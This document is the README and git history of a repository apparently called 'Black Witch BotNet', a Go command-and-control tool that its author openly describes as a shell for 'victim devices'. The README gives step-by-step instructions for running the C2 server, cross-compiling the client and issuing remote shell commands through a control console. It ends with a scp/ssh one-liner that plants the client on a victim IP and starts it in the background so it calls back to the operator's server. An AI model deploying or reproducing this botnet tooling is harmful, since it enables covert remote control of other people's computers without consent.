@@ -1,0 +1,353 @@
+======================: FILES :======================
+======================: README CONTENT :======================
+<img width="150px" src="https://blackwitchcoven.com/wp-content/uploads/2017/01/ccedb1918e81e3fcaad18aca53f8da7e.jpeg">
+
+# Black Witch BotNet
+#### The blank bundle to run the shell on your victim devices
+
+We are welkome to open issue
+
+## Usage
+#### Generate server certificate and key
+```
+openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout server.key -out server.crt
+```
+It's good enough to use self signed sertificate
+
+#### Run the server (cmd/server)
+```
+server -addr-accept :7238 -sock-control unix.sock -cert server.crt -key server.key
+```
+The server will open TCP and UNIX socket. TCP on 7238 port for incoming client connactions and UNIX unix.sock for control client connections.
+
+
+#### Run the client (cmd/client)
+```
+client -recon 1 -addr localhost:7238
+```
+This will run the client on the victim machine. For now you have to compile binary for os and arch victim.
+
+
+To view all available options use -help on the server and client
+
+
+## Control
+To manage connected payloads you may use nc or something that can connect to the unix sock
+```
+nc -U tmp/unix.sock
+```
+```
+socat - UNIX-CONNECT:unix.sock
+```
+
+You will see REPL console
+
+To show all connections
+
+```
+<CC:#> show
+```
+
+This will return
+
+```
+ID: 0 Address: 213.32.33.33:42656
+ID: 1 Address: 213.32.33.33:53622
+```
+
+Connect to connection
+```
+<CC:#> use 0
+```
+
+## Communicate with client payload
+#### Syntax
+
+```
+event [hello|restart]
+```
+
+```
+{shell} [{exec}|cd] command
+```
+
+Where {} is default and [] options
+
+#### Event message
+
+```
+event hello
+```
+
+It's a system event connection health
+
+```
+event restart
+```
+
+Events return status
+
+```
+Status true
+```
+
+Restart the client (CURRENTLY NOT SUPPORTED)
+
+#### Shell commands
+
+Simple command is
+
+```
+<213.32.33.33:42656:#> pwd
+```
+
+And this will return stdout
+
+```
+/Users
+```
+
+To change the directory
+
+```
+<213.32.33.33:42656:#> cd /Users
+```
+
+Will return new directory path
+
+```
+/Users
+```
+
+So we have shell commands and event messages for the client
+
+Client support hello and restart events
+
+Shell support simple exec and change directory
+
+#### Errors
+
+When the executable isn't found
+
+```
+exec: "ll": executable file not found in $PATH
+Error code 1
+```
+
+When you run executable incorrect
+
+```
+pwd: illegal option -- -
+usage: pwd [-L | -P]
+Exit 1
+```
+
+Return stderr and exit code
+
+When you change dir that isn't exist
+
+```
+chdir test: no such file or directory
+Error code 2
+```
+
+The last thing is command timeouts
+
+We have 10 seconds timeout to run the command or error will return
+
+```
+run command timeout
+Error code 0
+```
+
+Error codes
+
+```
+ErrorTimeout          = 0
+ErrorCommand          = 1
+ErrorChangeDir        = 2
+ErrorUnknownRequest   = 3
+ErrorUnknownShellType = 4
+ErrorUnknownEventType = 5
+```
+
+## Production
+#### Config server
+
+Create directory
+
+```
+mkdir /opt/black
+```
+
+Upload or generate server key and crt to this dir
+
+Then upload binary
+
+Create systemd file and copy content from [example](https://github.com/andrewostroumov/black-witch-botnet/blob/master/systemd.service):
+
+```
+touch /etc/systemd/system/black-witch.service
+```
+
+And run systemd service
+
+```
+sudo service black-witch start
+```
+
+#### Upload client
+
+Build client for target machine os and arch
+
+```
+GOOS=linux GOARCH=amd64 go build
+```
+
+Upload client through scp
+
+```
+scp client 33.33.33.33:/var/lib/ && ssh 33.33.33.33 "nohup /var/lib/client -addr 44.44.44.44:7328 -recon 5 > /dev/null 2>&1 &"
+```
+
+Where 33.33.33.33 is a victim ip and 44.44.44.44 is a your accept server ip
+====================== GIT HISTORY: ======================
+f2fc213 HEAD@{0}: clone: from https://github.com/andrewostroumov/black-witch-botnet
+commit f2fc213941c9253369a2cdf445c25d020d57519b
+Author: Andrew Ostroumov <andrew.ostroumov@gmail.com>
+Date:   Fri Sep 13 17:03:06 2019 +0300
+
+    Update README
+
+commit 79b1c42c20b17f6d0b2dd7c6cac242a0f552429d
+Author: Andrew Ostroumov <andrew.ostroumov@gmail.com>
+Date:   Fri Sep 13 17:02:04 2019 +0300
+
+    Update README
+
+commit 743a33e4a16272fa6d0e15222b3ed1b60eb89e15
+Author: Andrew Ostroumov <andrew.ostroumov@gmail.com>
+Date:   Wed Sep 11 17:48:11 2019 +0300
+
+    Create LICENSE
+
+commit 66ab3a90572a311e3ee3144cde8eb50500844a2f
+Author: Andrew Ostroumov <andrew.ostroumov@gmail.com>
+Date:   Wed Sep 11 14:55:20 2019 +0300
+
+    Update README.md
+
+commit ebbcbc7d21aedc13638e5d28adcb4d43b0524626
+Author: Andrew Ostroumov <andrew.ostroumov@gmail.com>
+Date:   Tue Sep 10 16:00:25 2019 +0300
+
+    Add systemd service
+
+commit 11d75d8b81f6e328c11e0e8ed165df1873e13616
+Author: Andrew Ostroumov <andrew.ostroumov@gmail.com>
+Date:   Tue Sep 10 15:46:22 2019 +0300
+
+    Add PL prefix
+
+commit af39199adb145069c63c49fdeed71ee8f68fea09
+Author: Andrew Ostroumov <andrew.ostroumov@gmail.com>
+Date:   Wed Sep 4 19:07:47 2019 +0300
+
+    Update README
+
+commit 21534b28e4489548a1e48e47836f4202941dec73
+Author: Andrew Ostroumov <andrew.ostroumov@gmail.com>
+Date:   Wed Sep 4 19:06:08 2019 +0300
+
+    Add context graceful shutdown
+
+commit 42e67d0c25c48176c0d2a7bac8b7ad231fed5f5e
+Author: Andrew Ostroumov <andrew.ostroumov@gmail.com>
+Date:   Tue Sep 3 15:20:55 2019 +0300
+
+    Add hello message to verify connection
+    Introduce version v1.0.0
+
+commit bcd3c49b50a15f5fbfe8bc9bdfe48ff26f92c734
+Author: Andrew Ostroumov <andrew.ostroumov@gmail.com>
+Date:   Tue Sep 3 00:26:23 2019 +0300
+
+    Add ability to change dir
+
+commit efeb2b3bf3f14c6933a4133e071261c6d4c60524
+Author: Andrew Ostroumov <andrew.ostroumov@gmail.com>
+Date:   Mon Sep 2 12:43:29 2019 +0300
+
+    Create README.md
+
+commit 96b27c6c2509b363655ac189b6afbea2c9e33205
+Author: Andrew Ostroumov <andrew.ostroumov@gmail.com>
+Date:   Mon Sep 2 12:27:19 2019 +0300
+
+    Rename package to Black Witch BotNet
+
+commit f08b5aa69fc28b191a8be1fbcc4699d46c68e18f
+Author: Andrew Ostroumov <andrew.ostroumov@gmail.com>
+Date:   Mon Sep 2 12:14:10 2019 +0300
+
+    Implement own binary protocol so we may transfer anything
+
+commit d9b0b6fe4ee604cad70842feccd73476cdf47569
+Author: Andrew Ostroumov <andrew.ostroumov@gmail.com>
+Date:   Tue Aug 27 21:27:49 2019 +0300
+
+    Add read deadline and run command timeout
+
+commit b66d0b04cd69cd10abb990f568e8191943163b79
+Author: Andrew Ostroumov <andrew.ostroumov@gmail.com>
+Date:   Tue Aug 27 17:37:45 2019 +0300
+
+    Update error format
+
+commit 26a25d4f52aa297f9554222eb67ef0931c3902d1
+Author: Andrew Ostroumov <andrew.ostroumov@gmail.com>
+Date:   Tue Aug 27 17:33:04 2019 +0300
+
+    Add type to response
+
+commit 51210c951a2585273ddf27f6ae27416909b0d0ca
+Author: Andrew Ostroumov <andrew.ostroumov@gmail.com>
+Date:   Tue Aug 27 13:57:30 2019 +0300
+
+    Add keep alive to accept server
+
+commit 62b20040672b3216e694c7a17b7b1588c02e1b9e
+Author: Andrew Ostroumov <andrew.ostroumov@gmail.com>
+Date:   Mon Aug 26 17:32:15 2019 +0300
+
+    Remove unused lines
+
+commit f8bbd88b800a031077ad7da75b924679044e8026
+Author: Andrew Ostroumov <andrew.ostroumov@gmail.com>
+Date:   Mon Aug 26 17:26:16 2019 +0300
+
+    Print response
+
+commit cf1dfcf0d852d9a6c151210fb7c9cffa92eec1d9
+Author: Andrew Ostroumov <andrew.ostroumov@gmail.com>
+Date:   Sun Aug 25 12:15:55 2019 +0300
+
+    Format project with go fmt and add sync.wg
+
+commit 815e763f82757d3c255fa386fdae27bfd6ee54b3
+Author: Andrew Ostroumov <andrew.ostroumov@gmail.com>
+Date:   Wed Aug 21 11:58:47 2019 +0300
+
+    Communicate with client by bson
+
+commit c2f34705055df742fe53a9e197701f8477972fba
+Author: Andrew Ostroumov <andrew.ostroumov@gmail.com>
+Date:   Fri Aug 9 14:23:10 2019 +0300
+
+    Improve TODO
+
+commit 8ac087fd1554344934c2325eafce3a50d11ceba5
+Author: Andrew Ostroumov <andrew.ostroumov@gmail.com>
+Date:   Fri Aug 9 14:22:37 2019 +0300
+
+    Make the base functionality
